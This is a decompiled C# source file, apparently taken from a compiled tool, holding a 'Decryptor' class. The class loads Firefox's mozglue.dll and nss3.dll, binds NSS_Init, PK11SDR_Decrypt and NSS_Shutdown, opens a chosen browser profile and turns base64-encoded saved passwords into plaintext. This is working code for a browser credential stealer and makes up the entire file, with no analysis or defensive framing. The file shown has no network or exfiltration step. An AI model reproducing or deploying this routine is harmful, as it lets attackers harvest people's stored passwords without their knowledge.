﻿using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SHARP
{
	// Token: 0x02000013 RID: 19
	public static class Decryptor
	{
		// Token: 0x0600006E RID: 110 RVA: 0x00002FA0 File Offset: 0x000011A0
		public static bool LoadNSS(string sPath)
		{
			bool result;
			try
			{
				Decryptor.hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
				Decryptor.hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");
				IntPtr procAddress = WinApi.GetProcAddress(Decryptor.hNss3, "NSS_Init");
				IntPtr procAddress2 = WinApi.GetProcAddress(Decryptor.hNss3, "PK11SDR_Decrypt");
				IntPtr procAddress3 = WinApi.GetProcAddress(Decryptor.hNss3, "NSS_Shutdown");
				Decryptor.fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Nss3.NssInit));
				Decryptor.fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(procAddress2, typeof(Nss3.Pk11SdrDecrypt));
				Decryptor.fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(procAddress3, typeof(Nss3.NssShutdown));
				result = true;
			}
			catch (Exception ex)
			{
				string str = "Failed to load NSS\n";
				Exception ex2 = ex;
				Console.WriteLine(str + ((ex2 != null) ? ex2.ToString() : null));
				result = false;
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x0000308C File Offset: 0x0000128C
		public static void UnLoadNSS()
		{
			Decryptor.fpNssShutdown();
			WinApi.FreeLibrary(Decryptor.hNss3);
			WinApi.FreeLibrary(Decryptor.hMozGlue);
		}

		// Token: 0x06000070 RID: 112 RVA: 0x000030AF File Offset: 0x000012AF
		public static bool SetProfile(string sProfile)
		{
			return Decryptor.fpNssInit(sProfile) == 0L;
		}

		// Token: 0x06000071 RID: 113 RVA: 0x000030C0 File Offset: 0x000012C0
		public static string DecryptPassword(string sEncPass)
		{
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				byte[] array = Convert.FromBase64String(sEncPass);
				intPtr = Marshal.AllocHGlobal(array.Length);
				Marshal.Copy(array, 0, intPtr, array.Length);
				Nss3.TSECItem tsecitem = default(Nss3.TSECItem);
				Nss3.TSECItem tsecitem2 = default(Nss3.TSECItem);
				tsecitem2.SECItemType = 0;
				tsecitem2.SECItemData = intPtr;
				tsecitem2.SECItemLen = array.Length;
				if (Decryptor.fpPk11SdrDecrypt(ref tsecitem2, ref tsecitem, 0) == 0 && tsecitem.SECItemLen != 0)
				{
					byte[] array2 = new byte[tsecitem.SECItemLen];
					Marshal.Copy(tsecitem.SECItemData, array2, 0, tsecitem.SECItemLen);
					return Encoding.UTF8.GetString(array2);
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return null;
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
			return null;
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000031A4 File Offset: 0x000013A4
		public static string GetUTF8(string sNonUtf8)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = sNonUtf8;
			}
			return result;
		}

		// Token: 0x04000033 RID: 51
		private static IntPtr hNss3;

		// Token: 0x04000034 RID: 52
		private static IntPtr hMozGlue;

		// Token: 0x04000035 RID: 53
		private static Nss3.NssInit fpNssInit;

		// Token: 0x04000036 RID: 54
		private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;

		// Token: 0x04000037 RID: 55
		private static Nss3.NssShutdown fpNssShutdown;
	}
}
